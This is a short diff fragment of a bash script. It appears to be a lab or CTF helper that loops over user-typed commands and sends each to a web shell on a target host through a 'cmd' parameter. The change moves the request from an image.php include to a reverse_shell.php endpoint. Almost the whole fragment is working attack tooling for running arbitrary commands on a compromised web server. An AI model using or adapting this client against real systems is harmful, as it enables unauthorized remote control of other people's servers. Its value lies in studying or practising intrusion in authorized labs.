@@ -11,6 +11,6 @@ while true; do
 
         echo -n "[~]> " && read -r comando
         comando=$(echo "$comando" | sed "s/ /+/g")
-        echo; curl -s -X GET "http://<TARGET_IP>/image.php?img=<PATH_TO_IMAGE>&cmd=$comando" | html2text; echo
+        echo; curl -s -X GET "http://<TARGET_IP>/reverse_shell.php?cmd=$comando" | html2text; echo
 
 done
